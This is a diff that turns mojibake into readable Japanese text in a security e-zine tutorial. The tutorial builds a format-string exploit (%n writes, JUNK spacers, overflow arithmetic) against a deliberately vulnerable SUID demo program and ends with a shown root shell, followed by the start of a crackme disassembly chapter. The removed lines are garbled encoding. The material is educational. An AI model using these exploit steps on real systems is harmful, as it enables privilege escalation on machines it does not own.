-\xf9\xff\xbf���Q�Ƃ��Ă��܂��܂��B���ʂƂ���2���ڂ�%n��3���ڂ�\x8e\xf9\x
-ff\xbf���Q�Ƃ��Ă��܂��܂��B
+　次に、2桁目の出力を行います。2桁目はbffff98d番地に0x000000bbを書き込み
+ます。現在のところ、170(0xaa)バイトの出力ができていますが、0xbbはここから
+さらに17バイト余分に文字を出力しなくてはなりません。当然、bffff98c番地に
+aaを格納するために利用した%108xの後ろに、フィールド幅オプションを指定しな
+ければなりません。しかし、%108xの後ろにはもう変換指定文字はありません。で
+すので、「`printf "\x8c\xf9\xff\xbf\x8d\xf9\xff\xbf\x8e\xf9\xff\xbf\x8f\
+xf9\xff\xbf"`%x.%x.%x.%x.%x.%x.%x.%n.%x.%n.%x.%n.%x.%n」のようにひとつめ
+の%nの後ろに%xを配置し、その後ろに2桁目の%nを置きます。
+　ただし、このままでは2桁目の%nの前の%xが、本来2桁目のアドレスである\x8d
+\xf9\xff\xbfを参照してしまいます。結果として2桁目の%nは3桁目の\x8e\xf9\x
+ff\xbfを参照してしまいます。
 
                           .-------------------------------------------------.
   .-----------------------|---------------------------------------.         |
- ��                      ��                                       |         |
+ ↓                      ↓                                       |         |
 -+-----------+-----------+-----------+-----------+----+----+----+----+----+----+----
  | bfffff98c | bfffff98d | bfffff98e | bfffff98f | %x | %x | ...| %n | %x | %n |
 -+-----------+-----------+-----------+-----------+----+----+----+----+----+----+
-            ��                                                         |
+            ↑                                                         |
              ^---------------------------------------------------------^
 
-���X�y�[�T�e�N�j�b�N
+●スペーサテクニック
 
-�@������������邽�߂ɁA�A�h���X�ƃA�h���X�̊ԂɃX�y�[�T�����܂��܂��B��
-�܂�A%x���Q�Ƃ��邽�߂̃_�~�[�̕�������͂��݂܂��B�ϊ��w�蕶����4�o�C�g
-����P�ʂƂ��邽�߁A�K����4�����̕�������͂��݂܂��B�悭�g����̂́uJ
-UNK�v�Ƃ���������ł��̂ŁA����ɏK��JUNK���͂���ł݂܂��B
+　これを解決するために、アドレスとアドレスの間にスペーサをかませます。つ
+まり、%xが参照するためのダミーの文字列をはさみます。変換指定文字は4バイト
+を一単位とするため、適当な4文字の文字列をはさみます。よく使われるのは「J
+UNK」という文字列ですので、これに習いJUNKをはさんでみます。
 
                           .-----------------------------------------------------------------------.
   .-----------------------|-------------------------------------------------------------.         |
- ��                      ��                                                             |         |
+ ↓                      ↓                                                             |         |
 -+-----------+------+-----------+------+-----------+------+-----------+----+----+----+----+----+----+--
  | bfffff98c | JUNK | bfffff98d | JUNK | bfffff98e | JUNK | bfffff98f | %x | %x | ...| %n | %x | %n |
 -+-----------+------+-----------+------+-----------+------+-----------+----+----+----+----+----+----+--
-             ��                                                                             |
+             ↑                                                                             |
               ^-----------------------------------------------------------------------------^
 
-�@%n�̌���%x��JUNK���Q�Ƃ��܂��B����%x�Ƀt�B�[���h���I�v�V�������w�肷
-��΁A�D���Ȓl��2���ڂɏ������Ƃ��ł��܂��B����ł́A���̕�����p����sco
-re�ϐ���0xddccbbaa�i10�i���ł�3721182122�j����������ł݂܂��傤�B�Ԃ�JU
-NK�Ƃ������������ꂽ�̂ŁA�o�̓o�C�g���͈ȑO�ƕω����Ă��܂��B����āA
-�܂��͉����w�肵�Ȃ���Ԃ�score�ϐ��ɉ����i�[����邩�m�F���܂��B
+　%nの後ろの%xはJUNKを参照します。この%xにフィールド幅オプションを指定す
+れば、好きな値を2桁目に書くことができます。それでは、この方式を用いてsco
+re変数に0xddccbbaa（10進数では3721182122）を書き込んでみましょう。間にJU
+NKという文字列を入れたので、出力バイト数は以前と変化しています。よって、
+まずは何も指定しない状態でscore変数に何が格納されるか確認します。
 
 -----
 newbie@Glazheim:knoppix$ game.exe `printf "\x7c\xf9\xff\xbfJUNK\x7d\xf9\xff\xbfJUNK\x7e\xf9\xff\xbfJUNK\x7f\xf9\xff\xbf"`%x.%x.%x.%x.%x.%x.%x.%n
 [debug]addr of score = bffff97c
 [debug]addr of payload = bffff940
-Score of |�^���\UNK}�^���\UNK~�^���\UNK�^���\ffffb59.1.bffff8b4.4d532038.532050.b7eb116c.1. is 75(4b)!! 
+Score of |鐃緒申UNK}鐃緒申UNK~鐃緒申UNK鐃緒申ffffb59.1.bffff8b4.4d532038.532050.b7eb116c.1. is 75(4b)!! 
 -----
 
-�@�ǂ����75�̂悤�ł��B0xaa��10�i����170�ł��̂ŁA170-75=95�B�܂�A96
-��%x�̕��w��I�v�V�����Ɏw�肷���0xaa���������߂܂��B
+　どうやら75のようです。0xaaは10進数で170ですので、170-75=95。つまり、96
+を%xの幅指定オプションに指定すれば0xaaを書き込めます。
 
 -----
 newbie@Glazheim:knoppix$ game.exe `printf "\x7c\xf9\xff\xbfJUNK\x7d\xf9\xff\xbfJUNK\x7e\xf9\xff\xbfJUNK\x7f\xf9\xff\xbf"`%x.%x.%x.%x.%x.%x.%96x.%n
 [debug]addr of score = bffff97c
 [debug]addr of payload = bffff940
-Score of |�^���\UNK}�^���\UNK~�^���\UNK�^���\ffffb57.1.bffff8b4.4d532038.532050.b7eb116c. 1. is 170(aa)!! 
+Score of |鐃緒申UNK}鐃緒申UNK~鐃緒申UNK鐃緒申ffffb57.1.bffff8b4.4d532038.532050.b7eb116c. 1. is 170(aa)!! 
 -----
 
-�@0xaa��0xbb�A0xbb��0xcc�A0xcc��0xdd�̊Ԃɂ͂��ꂼ��17�̈Ⴂ������܂���
-�ŁA�ȍ~��%x�̃t�B�[���h���w��ɂ�15�i�ϊ��w�蕶���̊Ԃ�.����ѕϊ��w�蕶
-�����g�����肵��2�������Ă���j���w�肵�܂��B
+　0xaaと0xbb、0xbbと0xcc、0xccと0xddの間にはそれぞれ17の違いがありますの
+で、以降は%xのフィールド幅指定には15（変換指定文字の間の.および変換指定文
+字自身を勘定して2を引いている）を指定します。
 
 -----
 newbie@Glazheim:knoppix$ game.exe `printf "\x6c\xf9\xff\xbfJUNK\x6d\xf9\xff\xbfJUNK\x6e\xf9\xff\xbfJUNK\x6f\xf9\xff\xbf"`%x.%x.%x.%x.%x.%x.%96x.%n.%15x.%n.%15x.%n.%15x.%n
 [debug]addr of score = bffff96c
 [debug]addr of payload = bffff930
-Score of l�^���\UNKm�^���\UNKn�^���\UNKo�^���\ffffb3f.1.bffff8a4.4d532038.532050.b7eb116c. 1.. 4b4e554a.. 4b4e554a.. 4b4e554a. is -573785174(ddccbbaa)!! 
+Score of l鐃緒申UNKm鐃緒申UNKn鐃緒申UNKo鐃緒申ffffb3f.1.bffff8a4.4d532038.532050.b7eb116c. 1.. 4b4e554a.. 4b4e554a.. 4b4e554a. is -573785174(ddccbbaa)!! 
 -----
 
-�@�ȏ�̂悤�ɁA0xddccbbaa���������ނ��Ƃ��ł��܂����B�����܂ł���΁ASE
-IP�ɋU�̖߂�A�h���X���㏑������܂Ō����ł��B
+　以上のように、0xddccbbaaを書き込むことができました。ここまでくれば、SE
+IPに偽の戻りアドレスを上書きするまで後一歩です。
 
-���߂�A�h���X�̏�������
+●戻りアドレスの書き込み
 
-�@�A�h���X���������ޏꍇ�A�����ЂƂC�ɂ��Ȃ���΂Ȃ�Ȃ����ڂ�����܂��B
-�A�h���X�͂悭�A0x0806abcd�̂悤�Ȓl�ɂȂ�܂��B0xcd�̎���0xab�����Ă���
-���Ƃ�����̋c��ł��B�C�t������������������Ǝv���܂����A�t�B�[���h��
-�I�v�V�����Ŏw��ł����̂͒l�������Ă����ꍇ�݂̂ł��B�A�h���X�̂悤�Ɉ�
-���Z���s��Ȃ���΂Ȃ�Ȃ��Ƃ��́A�܂��ʂ̃e�N�j�b�N��p���܂��B
+　アドレスを書き込む場合、もうひとつ気にしなければならない項目があります。
+アドレスはよく、0x0806abcdのような値になります。0xcdの次に0xabが来ている
+ことが今回の議題です。気付いた方もいらっしゃると思いますが、フィールド幅
+オプションで指定できたのは値が増えていく場合のみです。アドレスのように引
+き算を行わなければならないときは、また別のテクニックを用います。
 
-�������ӂ�ɂ��A�h���X�̏�������
+○桁あふれによるアドレスの書き込み
 
-�@���Z�ɂ���Č��Z���s�����Ƃ��ł���Ƃ����͎̂��m�̂��Ƃ��Ƃ͎v���܂����A
-�y���G��Ă����܂��B����2�������Ȃ��ꍇ�A50+67��17�ɂȂ�܂��B���𖳎���
-���50+67��117�ł����A2���ł���Ƃ���ΌJ��オ�������͖�������17�݂̂��F
-������܂��B�܂�A50+67�͉��Z�ł���Ȃ���50����33�����Z�������ƂɂȂ��
-���B���̂悤�Ɍ����ӂ�𗘗p����Ή��Z�݂̂Ō��Z���s�����Ƃ��ł���̂ł��B
-�@��������p����0x0806abcd������Ă݂܂��B
+　加算によって減算を行うことができるというのは周知のことだとは思いますが、
+軽く触れておきます。桁が2桁しかない場合、50+67は17になります。桁を無視す
+れば50+67は117ですが、2桁であるとすれば繰り上がった桁は無視され17のみが認
+識されます。つまり、50+67は加算でありながら50から33を減算したことになりま
+す。このように桁あふれを利用すれば加算のみで減算を行うことができるのです。
+　これを応用して0x0806abcdを作ってみます。
 
 -----
 newbie@Glazheim:knoppix$ ./game.exe `printf "\x7c\xf9\xff\xbfJUNK\x7d\xf9\xff\xbfJUNK\x7e\xf9\xff\xbfJUNK\x7f\xf9\xff\xbf"`%x%x%x%x%x%x%x%n
 [debug]add of score = bffff97c
-Score of |�^���\UNK}�^���\UNK~�^���\UNK�^���\ffffbedb7eb714eb7eb1efcb7ea942cb7fe9b9010 is 75(4b)!! 
+Score of |鐃緒申UNK}鐃緒申UNK~鐃緒申UNK鐃緒申ffffbedb7eb714eb7eb1efcb7ea942cb7fe9b9010 is 75(4b)!! 
 -----
 
-�@�����l��75�ł���Ƃ킩��܂����B��������cd�����܂��B0xCD=205�Ȃ̂�205
--75=130�ł���A131���t�B�[���h���Ɏw�肷��Ηǂ����Ƃ��킩��܂��B
+　初期値は75であるとわかりました。ここからcdを作ります。0xCD=205なので205
+-75=130であり、131をフィールド幅に指定すれば良いことがわかります。
 
 -----
 newbie@Glazheim:knoppix$ game.exe `printf "\x6c\xf9\xff\xbfJUNK\x6d\xf9\xff\xbfJUNK\x6e\xf9\xff\xbfJUNK\x6f\xf9\xff\xbf"`%x.%x.%x.%x.%x.%x.%131x.%n.%x.%n.%x.%n.%x.%n
 [debug]addr of score = bffff96c
 [debug]addr of payload = bffff930
-Score of l�^���\UNKm�^���\UNKn�^���\UNKo�^���\ffffb44.1.bffff8a4.4d532038.532050.b7eb116c. 1..4b4e554a..4b4e554a..4b4e554a.is -337520691(ebe1d7cd)!! 
+Score of l鐃緒申UNKm鐃緒申UNKn鐃緒申UNKo鐃緒申ffffb44.1.bffff8a4.4d532038.532050.b7eb116c. 1..4b4e554a..4b4e554a..4b4e554a.is -337520691(ebe1d7cd)!! 
 -----
 
-�@���ɁA0xab�����܂����A0xcd����0xab�����Ȃ��Ă͂Ȃ�Ȃ����߁A������
-���p���܂��B�܂�A0x1AB=427�ł���A1AB-CD=222�ł��̂ŁA���̃t�B�[���h
-���I�v�V�����ɂ�220���w�肵�܂��B�����ӂꂪ�������A���Z���\�ł��B
+　次に、0xabを作りますが、0xcdから0xabを作らなくてはならないため、桁あふ
+れを用います。つまり、0x1AB=427であり、1AB-CD=222ですので、次のフィールド
+幅オプションには220を指定します。桁あふれが発生し、減算が可能です。
 
 -----
 newbie@Glazheim:knoppix$ game.exe `printf "\x6c\xf9\xff\xbfJUNK\x6d\xf9\xff\xbfJUNK\x6e\xf9\xff\xbfJUNK\x6f\xf9\xff\xbf"`%x.%x.%x.%x.%x.%x.%131x.%n.%220x.%n.%x.%n.%x.%n
 [debug]addr of score = bffff96c
 [debug]addr of payload = bffff930
-Score of l�^���\UNKm�^���\UNKn�^���\UNKo�^���\ffffb41.1.bffff8a4.4d532038.532050.b7eb116c. 1.. 4b4e554a..4b4e554a..4b4e554a. is -1078613043(bfb5abcd)!! 
+Score of l鐃緒申UNKm鐃緒申UNKn鐃緒申UNKo鐃緒申ffffb41.1.bffff8a4.4d532038.532050.b7eb116c. 1.. 4b4e554a..4b4e554a..4b4e554a. is -1078613043(bfb5abcd)!! 
 -----
 
-�@����0x06���쐬���܂����A������܂������ӂ�𗘗p���Ȃ��Ă͂Ȃ�܂���B
-0x106=262�A0x106-0xAB=0x5B=91�ł��̂ŁA�t�B�[���h���ɂ�89���w�肵�܂��B
+　次に0x06を作成しますが、これもまた桁あふれを利用しなくてはなりません。
+0x106=262、0x106-0xAB=0x5B=91ですので、フィールド幅には89を指定します。
 
 -----
 newbie@Glazheim:knoppix$ game.exe `printf "\x6c\xf9\xff\xbfJUNK\x6d\xf9\xff\xbfJUNK\x6e\xf9\xff\xbfJUNK\x6f\xf9\xff\xbf"`%x.%x.%x.%x.%x.%x.%131x.%n.%220x.%n.%89x.%n.%x.%n
 [debug]addr of score = bffff96c
 [debug]addr of payload = bffff930
-Score of l�^���\UNKm�^���\UNKn�^���\UNKo�^���\ffffb3f.1.bffff8a4.4d532038.532050.b7eb116c. 1.. 4b4e554a.. 4b4e554a..4b4e554a. is 268872653(1006abcd)!!
+Score of l鐃緒申UNKm鐃緒申UNKn鐃緒申UNKo鐃緒申ffffb3f.1.bffff8a4.4d532038.532050.b7eb116c. 1.. 4b4e554a.. 4b4e554a..4b4e554a. is 268872653(1006abcd)!!
 -----
 
-�@�Ō��x08���쐬���܂��B����͈ꌩ�A0x08�̕����傫���̂ŉ��Z�݂̂ō쐬��
-�������ł����A�t�B�[���h���I�v�V�����́u�ŏ��v�\�������ł��邱�Ƃɒ��ӂ�
-�Ă��������B�܂�A3���ŕ\������Ǝw�肵�Ă��A�f�[�^��5���ł����5���ŕ\
-������܂��B�䂦�ɁA������܂������ӂ�𗘗p���Ȃ���΂Ȃ�܂���Bx108-x06
- = x102 = 258�ł��̂ŁA256���w�肵�܂��B
+　最後にx08を作成します。これは一見、0x08の方が大きいので加算のみで作成で
+きそうですが、フィールド幅オプションは「最小」表示桁数であることに注意し
+てください。つまり、3桁で表示すると指定しても、データが5桁であれば5桁で表
+示されます。ゆえに、これもまた桁あふれを利用しなければなりません。x108-x06
+ = x102 = 258ですので、256を指定します。
 
 -----
 newbie@Glazheim:knoppix$ game.exe `printf "\x5c\xf9\xff\xbfJUNK\x5d\xf9\xff\xbfJUNK\x5e\xf9\xff\xbfJUNK\x5f\xf9\xff\xbf"`%x.%x.%x.%x.%x.%x.%131x.%n.%220x.%n.%89x.%n.%256x.%n
 [debug]addr of score = bffff95c
 [debug]addr of payload = bffff920
-Score of \�^���\UNK]�^���\UNK^�^���\UNK_�^���\ffffb3c.1.bffff894.4d532038.532050.b7eb116c. 1.. 4b4e554a.. 4b4e554a.. 4b4e554a. is 134654925(806abcd)!! 
+Score of \鐃緒申UNK]鐃緒申UNK^鐃緒申UNK_鐃緒申ffffb3c.1.bffff894.4d532038.532050.b7eb116c. 1.. 4b4e554a.. 4b4e554a.. 4b4e554a. is 134654925(806abcd)!! 
 -----
 
-�@�ȏ�̂悤�ɁA0x0806abcd���쐬���邱�Ƃ��ł��܂����B����łǂ̂悤�Ȓl
-�ł��C�ӂ̃������ɏ������ނ��Ƃ��ł���悤�ɂȂ����킯�ł��B���̋L�O�i�H�j
-��root�����̒D������؂��Ă݂܂��傤�B
+　以上のように、0x0806abcdを作成することができました。これでどのような値
+でも任意のメモリに書き込むことができるようになったわけです。その記念（？）
+にroot権限の奪取を実証してみましょう。
 
 
-��0x05.) root�����D��̎���
+■0x05.) root権限奪取の実証
 
-�@���C�Â��̕�������������ł��傤���A����̃T���v���R�[�h�ɂ̓V�F���R
-�[�h���i�[���ꂽ�z�񂪔�����Ă��܂��B�ʏ�A�܂Ƃ��ȃv���O�����ɂ͂��̂�
-���Ȃ����炳�܂ȐƎ㐫�͂���܂���B�V�F���R�[�h�̓f�o�b�O��񂩂�bffff9
-20�Ԓn�ɑ��݂��Ă��邱�Ƃ��m�F�ł��܂��B�܂��Amain�֐���SEIP�̏ꏊ��bfff
-f96c�Ԓn�ɑ��݂��Ă��܂��B�܂�Abffff96c�Ԓn�̒��g��bffff920�ɏ�������
-�邱�Ƃ��ł���΁Amain�֐��̏I������payload�z��̐擪�ɏ������ڂ�A�V�F��
-�R�[�h���N�����܂��B
+　お気づきの方もいらっしゃるでしょうが、今回のサンプルコードにはシェルコ
+ードが格納された配列が備わっています。通常、まともなプログラムにはこのよ
+うなあからさまな脆弱性はありません。シェルコードはデバッグ情報からbffff9
+20番地に存在していることが確認できます。また、main関数のSEIPの場所はbfff
+f96c番地に存在しています。つまり、bffff96c番地の中身をbffff920に書き換え
+ることができれば、main関数の終了時にpayload配列の先頭に処理が移り、シェル
+コードが起動します。
 
-���܂���score�Ŏ����Ă݂悤
+●まずはscoreで試してみよう
 
-�@�����Ȃ�bffff96c�Ԓn�̒l������������̂͂��܂肨�����߂ł��܂���B�Ƃ�
-���܂��̂��Abffff96c�Ԓn�͏o�͂���Ȃ��̂ŁA�{���ɂ��܂�0xbffff920������
-�ł��Ă��邩�m�F���Ƃ�Ȃ����߂ł��B�ł��̂ŁA�͂��߂͏o�͂����score�ϐ�
-��0xbffff920������Ă݂܂��B
+　いきなりbffff96c番地の値を書き換えるのはあまりおすすめできません。とい
+いますのも、bffff96c番地は出力されないので、本当にうまく0xbffff920が生成
+できているか確認がとれないためです。ですので、はじめは出力されるscore変数
+に0xbffff920を作ってみます。
 
 -----
 newbie@Glazheim:knoppix$ ./game.exe `printf "\x5c\xf9\xff\xbfJUNK\x5d\xf9\xff\xbfJUNK\x5e\xf9\xff\xbfJUNK\x5f\xf9\xff\xbf"`%x.%x.%x.%x.%x.%x.%214x.%n.%215x.%n.%260x.%n.%190x.%n
 [debug]addr of score = bffff95c
 [debug]addr of payload = bffff920
-Score of \�^���\UNK]�^���\UNK^�^���\UNK_�^���\ffffb3b.1.bffff894.4d532038.532050.b7eb116c. 1.. 4b4e554a.. 4b4e554a.. 4b4e554a. is -1073743584(bffff920)!! 
+Score of \鐃緒申UNK]鐃緒申UNK^鐃緒申UNK_鐃緒申ffffb3b.1.bffff894.4d532038.532050.b7eb116c. 1.. 4b4e554a.. 4b4e554a.. 4b4e554a. is -1073743584(bffff920)!! 
 -----
 
-�@0xbffff920�̐����菇�͐�q�̒ʂ�A�����ӂ�𗘗p���Đ������܂��Bscore��
-�ɐ���ɐ����ł��Ă��邱�Ƃ��m�F�ł��܂����B
+　0xbffff920の生成手順は先述の通り、桁あふれを利用して生成します。score内
+に正常に生成できていることが確認できました。
 
-�������D��
+●権限奪取
 
-�@����ł́Abffff96c�Ԓn��0xbffff920�ɏ��������Ă݂܂��傤�B��قǂ̓���
-�̂����A�A�h���X�����������������OK�ł��Bgame.exe��SUID�r�b�g�������Ă�
-�āA���L�҂�root�ɂȂ��Ă��܂��B
+　それでは、bffff96c番地を0xbffff920に書き換えてみましょう。先ほどの入力
+のうち、アドレス部分を書き換えればOKです。game.exeはSUIDビットが立ってい
+て、所有者がrootになっています。
 
 -----
 newbie@Glazheim:knoppix$ ./game.exe `printf "\x6c\xf9\xff\xbfJUNK\x6d\xf9\xff\xbfJUNK\x6e\xf9\xff\xbfJUNK\x6f\xf9\xff\xbf"`%x.%x.%x.%x.%x.%x.%230x.%n.%199x.%n.%260x.%n.%190x.%n
 [debug]addr of score = bffff95c
 [debug]addr of payload = bffff920
-Score of l�^���\UNKm�^���\UNKn�^���\UNKo�^���\ffffb3b.1.bffff894.4d532038.532050.b7eb116c. 1.. 4b4e554a.. 4b4e554a.. 4b4e554a. is 0(0)!!
+Score of l鐃緒申UNKm鐃緒申UNKn鐃緒申UNKo鐃緒申ffffb3b.1.bffff894.4d532038.532050.b7eb116c. 1.. 4b4e554a.. 4b4e554a.. 4b4e554a. is 0(0)!!
 sh-3.00# whoami
 root
 -----
 
-�@root�������D��ł��Ă��邱�Ƃ��m�F�ł��܂����B���̂悤�ɁASEIP���y�C��
-�[�h�̐擪�ɏ��������邱�Ƃ��ł���΁ABOF�̎��Ɠ����悤�ɐ��䂪�y�C���[�h
-�Ɉڂ�܂��B����̓y�C���[�h�̊i�[��Ƃ��āA�v���O�������̔z���p���܂�
-�����A���ϐ��Ɋi�[�����y�C���[�h�ɐ�����ڂ����Ƃ��\�ł��B����ɂ�
-�Ă͂܂�������A���Ԃ�����Ƃ��ɐG�ꂽ���Ǝv���܂��B
+　root権限が奪取できていることが確認できました。このように、SEIPをペイロ
+ードの先頭に書き換えることができれば、BOFの時と同じように制御がペイロード
+に移ります。今回はペイロードの格納先として、プログラム内の配列を用いまし
+たが、環境変数に格納したペイロードに制御を移すことも可能です。これについ
+てはまたいずれ、時間があるときに触れたいと思います。
 
 
-��0x06.) ������
+■0x06.) おわりに
 
-�@�������ł����ł��傤���B�t�H�[�}�b�g�X�g�����O�U���ł��C�ӂ̃v���O����
-�����s�ł��邱�Ƃ������������������Ǝv���܂��B���Ȃ�댯�ȃo�O�ł����A��
-�ȓ��͂��s���Ȃ�����ʏ�ǂ���o�͂���邽�߁A����������o�O�ł��B
-�@���āA����܂ł�BOF�ƃt�H�[�}�b�g�X�g�����O�U���Ƃ���2��U����@��p��
-��root������D�悷����؂��s���Ă��܂����B���ݗ��s���Ă���A�Ђƒʂ�̃n
-�b�L���O��@���y��������܂����̂ŁA����͏����N���n�̃g�s�b�N�X���痣��
-�Č��܂��B����̓o�b�N�h�A�i�����쐬�j�ɂ��ĉ���������Ǝv���܂��B
+　いかがでしたでしょうか。フォーマットストリング攻撃でも任意のプログラム
+を実行できることをご理解いただけたと思います。かなり危険なバグですが、妙
+な入力が行われない限り通常どおり出力されるため、発見が難しいバグです。
+　さて、今回まででBOFとフォーマットストリング攻撃という2大攻撃手法を用い
+てroot権限を奪取する実証を行ってきました。現在流行している、ひと通りのハ
+ッキング手法を軽く解説しましたので、次回は少し侵入系のトピックスから離れ
+て見ます。次回はバックドア（裏口作成）について解説したいと思います。
 
 
-
-x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
-x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
-
---- ��5��: �t�A�Z���u���R�[�h��ǂ�ł݂悤 ---
-
-���ҁFKenji Aiko
 
 x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
 x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
 
+--- 第5章: 逆アセンブルコードを読んでみよう ---
 
-��0x01.) �͂��߂�
+著者：Kenji Aiko
 
-�@��{�I�ȉ�͋Z�p���o������A���̃X�e�b�v�֐i�ނ��߂ɂ͂ǂ�������ǂ���
-�낤�H�@���́A��͂̊�{�͂�͂�u�A�Z���u���R�[�h��ǂނ��Ɓv���ƍl����
-���܂��B���݂͗l�X�ȃc�[��������A��������g���Č����I�ȃ\�t�g�E�F�A��
-�͂��s���܂����A�c�[���͂����܂Ńc�[���ł���A�����L�����p���邽�߂ɂ́A
-��͂��b�ƂȂ�Z�p���K�v���Ǝv���܂��B����āA����́u�A�Z���u���R�[�h
-��ǂނ��Ɓv�𒆐S�Ƃ������o�[�X�G���W�j�A�����O�ɂ��ĉ�����܂��B
-�@�g�p����c�[����OllyDbg�I�����[�ł��B����OllyDbg���t�A�Z���u���R�[�h��
-�o�͂��邱�Ƃ����ɂ����g���Ă܂���i�����B
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
 
 
-��0x02.) crackme���蓮�Ńf�R���p�C��
+■0x01.) はじめに
 
-�@�ȉ��́A�ȒP��crackme���t�A�Z���u�������R�[�h�ł��B
+　基本的な解析技術を覚えた後、次のステップへ進むためにはどうしたら良いだ
+ろう？　私は、解析の基本はやはり「アセンブルコードを読むこと」だと考えて
+います。現在は様々なツールがあり、それらを駆使して効率的なソフトウェア解
+析を行えますが、ツールはあくまでツールであり、それを有効活用するためには、
+やはり基礎となる技術が必要だと思います。よって、今回は「アセンブルコード
+を読むこと」を中心としたリバースエンジニアリングについて解説します。
+　使用するツールはOllyDbgオンリーです。そのOllyDbgも逆アセンブルコードを
+出力することだけにしか使ってません（ぉぃ。
+
+
+■0x02.) crackmeを手動でデコンパイル
+
+　以下は、簡単なcrackmeを逆アセンブルしたコードです。
 
 -----  sample01.exe
 00401000 >/$  837C24 04 02  CMP DWORD PTR SS:[ESP+4],2
@@ -1375,31 +1375,31 @@ x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
 00401054  \.  C3            RETN
 -----
 
-�@�ł́A�����C����̃\�[�X�R�[�h�ɁA�蓮�Ńf�R���p�C�����܂��傤�B
-�@�܂��́A��ԍŏ��u00401000�v�̖��߂ł����A�u2�v�Ɖ����̒l��CMP�Ŕ�r��
-�Ă��܂��B�����āAJGE�Ȃ̂ŁA2�ȏゾ������W�����v�ł��B�܂�A���̂悤
-�ɐ����ł��܂��B
+　では、これをC言語のソースコードに、手動でデコンパイルしましょう。
+　まずは、一番最初「00401000」の命令ですが、「2」と何かの値をCMPで比較し
+ています。そして、JGEなので、2以上だったらジャンプです。つまり、次のよう
+に推測できます。
 
 -----  sample01.cpp
 if(x < 2)
     return 1;
 -----
 
-�@�K���ȕϐ�x���A2��菬�����Ȃ�uMOV EAX, 1�v�ƁuRETN�v�Ȃ̂ŁA�ureturn
- 1�v�ƕϊ��ł��܂��B�܂��Ax��ESP+4�������Ă��邽�߁A�����ƕ�����܂��B
-�@���āA����2�ȏ�Ȃ�΁AJGE�̓W�����v���܂��B�ł́A�W�����v��u0040100D�v
-�����Ă����܂��B
+　適当な変数xが、2より小さいなら「MOV EAX, 1」と「RETN」なので、「return
+ 1」と変換できます。また、xはESP+4から取られているため、引数と分かります。
+　さて、もし2以上ならば、JGEはジャンプします。では、ジャンプ先「0040100D」
+を見ていきます。
 
 -----  sample01.exe
 0040100D  |>  8B4424 08     MOV EAX,DWORD PTR SS:[ESP+8]
 00401011  |.  8B48 04       MOV ECX,DWORD PTR DS:[EAX+4]
 -----
 
-�@�A�h���X�u00401011�v�ŁAEAX+4���Q�Ƃ��Ă��邽�߁AEAX�̓A�h���X�ł��B��
-���Ă��̎Q�Ɛ��ECX�ɓ���Ă��܂��B���ɁAPUSH�Łuwizardbible�v�Ƃ�������
-��̃A�h���X���X�^�b�N�֐ς�ł���A����ECX���X�^�b�N�֐ς�ł��܂��B����
-�āAlstrcmpA�Ȃ̂ŁAECX�͕�����̃A�h���X���ƍl�����܂��B����Ĉȉ��̃R
-�[�h�ɂȂ�܂��B
+　アドレス「00401011」で、EAX+4を参照しているため、EAXはアドレスです。そ
+してその参照先をECXに入れています。次に、PUSHで「wizardbible」という文字
+列のアドレスをスタックへ積んでおり、次にECXをスタックへ積んでいます。そし
+て、lstrcmpAなので、ECXは文字列のアドレスだと考えられます。よって以下のコ
+ードになります。
 
 -----  sample01.cpp
 if(x < 2)
@@ -1407,35 +1407,35 @@ if(x < 2)
 lstrcmp(y(ECX), "wizardbible");
 -----
 
-�@�܂��Alstrcmp�̖߂�l���g���ĕ��򂵂Ă��܂��B����ɂ�TEST���߂��g���Ă�
-�܂��BTEST���߂́A��{��AND���߂Ɠ����ł����AAND�̌��ʂ�ۑ������A�t���O
-�����ω����邽�߁A��������ɂ悭�g���܂��B
+　また、lstrcmpの戻り値を使って分岐しています。分岐にはTEST命令を使ってい
+ます。TEST命令は、基本はAND命令と同じですが、ANDの結果を保存せず、フラグ
+だけ変化するため、条件分岐によく使われます。
 
 -----  sample01.exe
-00401020  |.  85C0          TEST EAX,EAX�i��lstrcmpA�̖߂�l��r�j
+00401020  |.  85C0          TEST EAX,EAX（←lstrcmpAの戻り値比較）
 00401022  |.  6A 00         PUSH 0 ; /Style = MB_OK|MB_APPLMODAL
 00401024  |.  68 2C514000   PUSH OFFSET |Title = "Message"
-00401029  |.  75 15         JNZ SHORT sample01.00401040�i��r�ɂ��W�����v�j
+00401029  |.  75 15         JNZ SHORT sample01.00401040（比較によるジャンプ）
 -----
 
-�@�uTEST EAX, EAX�v�Ƃ��Ă��܂����A���̂悤�ȁu�����l��AND�v�͕K�������l
-�ɂȂ�܂���ˁi�uAND 5, 5�v�́u5�v�ł��j�B�������A����EAX���u0�v�Ȃ�΁A
-����AND�iTEST�j�̌��ʂ́u0�v�ƂȂ�܂��B����āA���̂悤�ɋL�q���邱�Ƃ�
-�u0�v���u����ȊO�̒l�v���A�Ƃ����悤�ɁA�����𕪂����܂��B
-�@���̂��Ƃ���A�R�[�h�͈ȉ��ɂȂ�܂��B
+　「TEST EAX, EAX」としていますが、このような「同じ値のAND」は必ず同じ値
+になりますよね（「AND 5, 5」は「5」です）。しかし、もしEAXが「0」ならば、
+このAND（TEST）の結果は「0」となります。よって、このように記述することで
+「0」か「それ以外の値」か、というように、条件を分けられます。
+　このことから、コードは以下になります。
 
 -----  sample01.cpp
 if(x < 2)
     return 1;
 if(lstrcmp(y, "wizardbible") == 0)
-    // �����̏���
+    // 何かの処理
 else
-    // �����̏���
+    // 何かの処理
 -----
 
-�@����ɁAPUSH�ɂ��uMB_OK|MB_APPLMODAL�v�Ɓu"Message"�v���X�^�b�N�֓���
